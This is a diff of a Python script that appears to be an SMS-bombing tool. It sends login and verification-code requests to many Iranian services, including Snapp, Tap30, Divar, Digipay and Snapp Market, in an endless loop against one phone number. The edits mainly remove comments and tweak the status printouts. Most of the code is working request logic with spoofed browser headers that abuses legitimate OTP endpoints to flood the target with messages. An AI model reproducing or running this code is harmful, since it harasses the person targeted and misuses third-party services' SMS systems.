@@ -1,4 +1,4 @@
- #LIBRARIES
+#LIBRARIES 
 from os import system
 try: 
  from time import sleep
@@ -59,7 +59,6 @@ except KeyboardInterrupt:
 
 #SMS API_KEYS
 bingo = (f"https://api.binjo.ir/api/panel/get_code/0{numbers}")
-#snapp = (f"https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0{numbers}/sms?cCode=+98")
 igap = (f"https://core.gap.im/v1/user/add.json?mobile=0{numbers}")
 filmnet = (f"https://api-v2.filmnet.ir/access-token/users/0{numbers}/otp")
 def snapp(numbers): #Snapp
@@ -67,7 +66,7 @@ def snapp(numbers): #Snapp
     snapD = {"cellphone":"+98"+numbers}
     sna = post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD ).status_code
 def tap30(numbers):#TAP30
-  try:  #tap30 api
+  try: 
     tap30H = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://app.tapsi.cab","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.tapsi.cab/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
     tap30D = {"credential":{"phoneNumber":"0"+numbers.split("+98"),"role":"PASSENGER"}}
     tap30R = post("https://tap33.me/api/v2/user",headers=tap30H, json=tap30D).status_code 
@@ -79,7 +78,6 @@ def hamrahkart(numbers):#hamrahkart
     post("https://hamrahcard.ir/wp-admin/admin-ajax.php",data=hamrah).status_code
             
 def divar(numbers):#divar
-    #divar api
     divarH = {"Host": "api.divar.ir","Connection": "keep-alive","Content-Length": "22","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded","Origin": "https://divar.ir","Sec-Fetch-Site": "same-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://divar.ir/my-divar/my-posts","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
     divarD = {"phone":numbers.split("+98")[1]}
     divarR = post("https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD)
@@ -89,7 +87,6 @@ def digipay(numbers):#DIGIPAY
     post("https://app.mydigipay.com/digipay/api/users/send-sms",json=digij).status_code  
 
 def smarket(numbers):#SNAPP MARKET 
-    #snapp market api
     smarketH = {"Host": "api.snapp.market","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "application/json, text/plain, */*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","Origin": "https://snapp.market","Connection": "keep-alive","Referer": "https://snapp.market/?utm_expid=.pY75G19ZSxqVL9e0bOzqzA.0&utm_referrer=https%3A%2F%2Fwww.google.com%2F","Cookie": "_gcl_au=1.1.2061927570.1597858187; _ga=GA1.2.1125304048.1597858200; _gid=GA1.2.1715017326.1597858200; _gaexp=GAX1.2.pY75G19ZSxqVL9e0bOzqzA.18534.0; _hjid=9ed8e1f0-497e-499c-b1ce-ae58867da1bf; _hjAbsoluteSessionInProgress=1; _gat_UA-115113209-4=1","Content-Length": "0","TE": "Trailers"}
     smarketD = "0"+numbers
     smarketR = post(f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={smarketD}', headers=smarketH ).status_code
@@ -137,13 +134,13 @@ while True:
       else:
           print(Fore.RED+"[-] digipay raft tosh")
      #GAP REQUESTS 
-      if gap(numbers) == 200:
+      if gap == 200:
           print(Fore.GREEN+"[ + ] igap raft tosh")
       else:
-          print(Fore.RED+"[-] igap raft tosh")
-     #SNAPP MARKET REQUESTS 
+          print(Fore.RED+"[-] igap kiret kard")
+     #SNAPP MARKET REQUESTS      
       if smarket(numbers) == 200:
-          print(Fore.GREEN+"[ + ] SnappMarket raft tosh")
+         print(Fore.GREEN+"[ + ] SnappMarket raft tosh")
       else:
           print(Fore.RED+"[-] SnapMarket raft tosh")
       continue
